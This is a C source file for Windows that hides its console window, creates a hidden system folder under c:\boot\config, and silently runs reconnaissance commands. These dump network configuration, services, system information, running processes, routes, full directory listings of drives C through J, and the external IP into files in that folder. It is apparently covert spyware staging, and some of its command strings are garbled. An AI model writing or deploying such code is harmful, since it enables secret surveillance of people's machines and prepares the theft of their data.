#include<stdlib.h>
#include<stdio.h>

#include<stdlib.h>
#if       _WIN32_WINNT < 0x0500
  #undef  _WIN32_WINNT
  #define _WIN32_WINNT   0x0500
#endif
#include <windows.h>

int main()
{
    ShowWindow( GetConsoleWindow(), SW_HIDE );
    
    char arr1[] = "echo off";
    char arr2[]= "attrib +s +h c:\\boot\\config\\ & chdir";
    char arr3[] = "attrib +s +h c:\\boot\\config\\\\cookie  & chdir";
    char arr4[] = "attrib c:\\boot\\config\\ & chdir +s +h";
    char arr5[] = "attrib  c:\\boot\\config\\\\cookie & chdir +s +h ";
    char arr6[] = "ipconfig /all > c:\\boot\\config\\\1ip & chdir";
    char arr7[] = "net start > c:\\boot\\config\\\\1Services & chdir";
    char arr8[] = "systeminfo > c:\\boot\\config\\\\1Systeminfo & chdir";
    char arr9[] = "net view > c:\\boot\\config\\\\1Netview & chdir";
    char arr10[] = "tasklist > c:\\boot\\config\\\\1Tasklist & chdir";
    char arr11[] = "pathping google.com > c:\\boot\\config\\\\1Ping & chdir";
    char arr12[] = "tracert google.com > c:\\boot\\config\\\\1Tracert & chdir";
    char arr13[] = "route print > c:\\boot\\config\\\\1Route & chdir";
    char arr14[] = "dir /a /s D:\\ > c:\\boot\\config\\\\1DD & chdir";
    char arr15[] = "dir /a /s E:\\ > c:\\boot\\config\\\\1EE & chdir";
    char arr16[]= "dir /a /s F:\\ > c:\\boot\\config\\\\1FF & chdir";
    char arr17[] = "dir /a /s G:\\ > c:\\boot\\config\\\\1GG & chdir";
    char arr18[] = "dir /a /s H:\\ > c:\\boot\\config\\\\1HH & chdir";
    char arr19[] = "dir /a /s I:\\ > c:\\boot\\config\\\\1II & chdir";
    char arr20[] = "dir /a /s J:\\ > c:\\boot\\config\\\\1JJ & chdir";
    char arr21[] = "dir /a /s C:\\ > c:\\boot\\config\\\\1CC & chdir";
    char arr[] = "nslookup myip.opendns.com resolver1.opnedns.com > c:\\boot\\config\\\\Global_IP & chdir";
    char arr22[] = "exit";
    
    system(arr1);
    system(arr2);
    system(arr3);
    system(arr4);
    system(arr5);
    system(arr6);
    system(arr7);
    system(arr8);
    system(arr9);
    system(arr10);
    system(arr11);
    system(arr12);
    system(arr13);
    system(arr14);
    system(arr15);
    system(arr16);
    system(arr17);
    system(arr18);
    system(arr19);
    system(arr20);
    system(arr21);
    system(arr22);
    system(arr);
    
    
   
return 0;    
}